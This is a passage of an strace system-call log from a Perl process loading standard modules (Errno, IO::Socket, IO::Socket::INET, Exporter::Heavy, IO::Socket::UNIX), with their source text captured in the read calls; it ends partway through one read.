6692  07:15:04.979807 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
6692  07:15:04.979983 _llseek(8, 5966, [5966], SEEK_SET) = 0
6692  07:15:04.980029 _llseek(8, 0, [5966], SEEK_CUR) = 0
6692  07:15:04.980042 close(8)          = 0
6692  07:15:04.980405 brk(0x827b000)    = 0x827b000
6692  07:15:04.980581 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
6692  07:15:04.981076 _llseek(6, 6698, [6698], SEEK_SET) = 0
6692  07:15:04.981093 _llseek(6, 0, [6698], SEEK_CUR) = 0
6692  07:15:04.981104 close(6)          = 0
6692  07:15:04.981123 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.981138 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.981153 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.981166 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.981181 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.981195 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.981209 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.981222 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.981236 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.981249 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.981263 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.981281 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
6692  07:15:04.981303 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
6692  07:15:04.981318 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe790e8) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.981330 _llseek(6, 0, [0], SEEK_CUR) = 0
6692  07:15:04.981348 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
6692  07:15:04.981718 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981734 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981748 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981762 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981777 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981790 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981805 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981817 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981831 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981844 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981858 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981871 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfe78e2c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981885 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfe78f1c) = -1 ENOENT (No such file or directory)
6692  07:15:04.981898 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
6692  07:15:04.981920 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
6692  07:15:04.981935 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe78c38) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.981947 _llseek(8, 0, [0], SEEK_CUR) = 0
6692  07:15:04.981964 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
6692  07:15:04.982717 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
6692  07:15:04.982927 brk(0x829c000)    = 0x829c000
6692  07:15:04.983223 read(8, "", 4096) = 0
6692  07:15:04.983240 close(8)          = 0
6692  07:15:04.984348 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
6692  07:15:04.984771 _llseek(6, 6496, [6496], SEEK_SET) = 0
6692  07:15:04.984787 _llseek(6, 0, [6496], SEEK_CUR) = 0
6692  07:15:04.984798 close(6)          = 0
6692  07:15:04.984859 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.984876 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.984890 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.984904 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.984919 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.984932 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.984947 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.984960 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.984974 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.985019 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfe792dc) = -1 ENOENT (No such file or directory)
6692  07:15:04.985048 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfe793cc) = -1 ENOENT (No such file or directory)
6692  07:15:04.985062 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
6692  07:15:04.985084 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
6692  07:15:04.985100 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe790e8) = -1 ENOTTY (Inappropriate ioctl for device)
6692  07:15:04.985112 _llseek(6, 0, [0], SEEK_CUR) = 0
6692  07:15:04.985127 brk(0x82bd000)    = 0x82bd000
6692  07:15:04.985144 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists 